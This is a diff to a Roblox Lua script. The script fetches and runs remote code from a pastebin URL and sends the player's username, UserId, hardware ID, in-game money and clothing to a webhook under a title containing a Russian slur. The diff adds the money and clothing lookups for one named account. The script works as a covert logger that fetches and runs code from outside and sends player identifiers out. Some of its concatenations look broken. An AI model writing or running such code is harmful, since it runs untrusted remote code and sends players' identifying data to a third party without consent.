@@ -1,6 +1,9 @@
 local asdachsfasdfaeckdasdasdafasdd = loadstring(game:HttpGet('https://pastebin.com/raw/sg3se9hA'))()
 local hwid =  game:GetService("RbxAnalyticsService"):GetClientId()
 
+local clamount = game:GetService("Players").AnnaKaira222.Odezda:GetChildren()
+local money = game:GetService("Players").AnnaKaira222.leaderstats.Rub
+
 local success, response = pcall(function()
     
 	local webhookcheck =
@@ -17,7 +20,7 @@ local success, response = pcall(function()
         ["embeds"] = {
             {
                 ["title"] = "**PIDARAS DETECTED**",
-                ["description"] = "Username: " .. game.Players.LocalPlayer.Name .. " \n Hwid: " .. hwid ,
+                ["description"] = "Username: " .. game.Players.LocalPlayer.Name ..  " \n UserId: " .. game.Players.LocalPlayer.UserId .. " \n Hwid: " .. hwid .. "\n Money:" .. money .. "\n Clotches:" .. clamount,
                 ["type"] = "rich",
                 ["color"] = tonumber(0x7269da),
             }
